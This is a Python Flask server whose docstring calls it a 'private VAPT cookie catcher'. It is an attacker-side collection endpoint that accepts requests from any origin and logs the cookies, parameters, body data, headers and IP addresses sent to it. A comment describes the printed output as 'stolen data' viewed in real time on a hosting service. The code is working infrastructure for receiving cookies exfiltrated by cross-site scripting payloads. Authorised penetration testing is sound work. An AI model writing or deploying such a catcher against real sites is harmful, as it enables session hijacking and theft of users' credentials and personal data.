from flask import Flask, request, jsonify
from datetime import datetime
import json

# FIX: Added instance_path to prevent crash on Python 3.14
app = Flask(__name__, instance_path='/tmp/instance')

@app.route('/', methods=['GET', 'POST', 'OPTIONS'])
def receive_cookie():
    """
    Receives and logs cookies and data sent via GET or POST.
    This is your private VAPT cookie catcher.
    """
    # Extract data from different parts of the request
    cookies = request.cookies
    get_params = request.args.to_dict()
    
    # Handle JSON payload or standard form data
    if request.is_json:
        post_data = request.get_json(silent=True)
    else:
        post_data = request.form.to_dict()

    # If nothing was sent, check if raw data was posted
    if not post_data and request.data:
        try:
            post_data = json.loads(request.data)
        except:
            post_data = {"raw_data": request.data.decode('utf-8', errors='ignore')}

    # Build a structured log entry
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "cookies": cookies,
        "get_params": get_params,
        "post_data": post_data,
        "headers": dict(request.headers),
        "remote_addr": request.remote_addr,
        "user_agent": request.headers.get('User-Agent')
    }

    # Print to Render's live logs so you can see the stolen data in real-time
    print("=" * 70)
    print(f"📩 DATA RECEIVED at {log_entry['timestamp']}")
    print(f"🌐 From IP: {request.remote_addr}")
    print(f"🖥️  User-Agent: {request.headers.get('User-Agent')}")
    print("-" * 70)
    
    if cookies:
        print(f"🍪 COOKIES FOUND: {json.dumps(cookies, indent=2)}")
    else:
        print("🍪 No cookies found in the request.")
    
    if get_params:
        print(f"📦 GET PARAMETERS: {json.dumps(get_params, indent=2)}")
    
    if post_data:
        print(f"📨 POST DATA: {json.dumps(post_data, indent=2)}")
    
    print("=" * 70)

    # Return a simple success response
    return jsonify({
        "status": "success",
        "message": "Cookie received successfully!",
        "received": {
            "cookies": cookies,
            "params": get_params,
            "data": post_data
        }
    }), 200

# Enable Cross-Origin Resource Sharing (CORS) so you can test from any browser
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type, Cookie')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

if __name__ == '__main__':
    # Render requires the server to listen on 0.0.0.0
    app.run(host='0.0.0.0', port=5000)
